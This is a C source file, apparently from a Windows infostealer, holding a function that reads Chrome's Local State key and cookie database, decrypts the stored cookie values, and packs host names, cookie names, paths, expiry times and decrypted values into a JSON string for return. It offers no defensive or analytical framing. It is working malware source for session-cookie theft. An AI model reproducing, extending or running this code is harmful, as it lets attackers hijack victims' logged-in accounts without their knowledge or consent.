#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <windows.h>
#include <cJSON/cJSON.h>
#include <sqlite3.h>
#include <time.h>
#include "Chrome.h"

char* GetChromeSavedCookies() {
	char chromeCookiesPath[MAX_PATH_LENGTH],LocalStatePath[MAX_PATH_LENGTH];
	CHROME_PATH_LOCAL_STATE(LocalStatePath);
	CHROME_PATH_COOKIES(chromeCookiesPath);
	char *json_string;
	
	DATA_BLOB SecretKey;
	GetSecretKey(LocalStatePath, &SecretKey);

	sqlite3* conn = getDBConnection(chromeCookiesPath);
	if (conn != NULL) {
		sqlite3_stmt *stmt;
		const char *query = "SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies";
		if (sqlite3_prepare_v2(conn, query, -1, &stmt, NULL) == SQLITE_OK) {
			int result;
			// Create a cJSON array
    		cJSON *json_array = cJSON_CreateArray();
    		int i = 1;
			while ((result = sqlite3_step(stmt)) == SQLITE_ROW) {
				
				char* host_key = strdup((char*)sqlite3_column_text(stmt, 0));
				char* name = strdup((char*)sqlite3_column_text(stmt, 1));
				char* path = strdup((char*)sqlite3_column_text(stmt, 2));
				BYTE* encrypted_value = (BYTE*)sqlite3_column_blob(stmt, 3);
				int bytes = sqlite3_column_bytes(stmt, 3);
				time_t expires_utc = (time_t)sqlite3_column_int64(stmt, 4);
				if(strcmp(host_key, "") && strcmp(name, "") && strcmp(path, "") && memcmp(encrypted_value,"",1)){
					DATA_BLOB cipher = (DATA_BLOB) {bytes,encrypted_value};
					// Create a cJSON object for an entry
					cJSON *entry = cJSON_CreateObject();
					// Add id, host_key, name, path, cookies and expires_utc  to the entry
					cJSON_AddNumberToObject(entry, "id", i);
					cJSON_AddStringToObject(entry, "host_key", host_key);
					cJSON_AddStringToObject(entry, "name", name);
					cJSON_AddStringToObject(entry, "path", path);
					cJSON_AddNumberToObject(entry, "expires_utc", expires_utc);
					cJSON_AddStringToObject(entry, "Cookies", DecryptPassword(cipher,SecretKey));

					// Add the entry to the array
					cJSON_AddItemToArray(json_array, entry);
					i++;
					if(i==70) break;
				}	
			}
			
			json_string = cJSON_Print(json_array);
			cJSON_Delete(json_array);
			sqlite3_finalize(stmt);

		} else {
			fprintf(stderr, "Error preparing SQL statement: %s\n", sqlite3_errmsg(conn));
		}
		
	}
	remove("temp.db");
	return json_string;
	
}
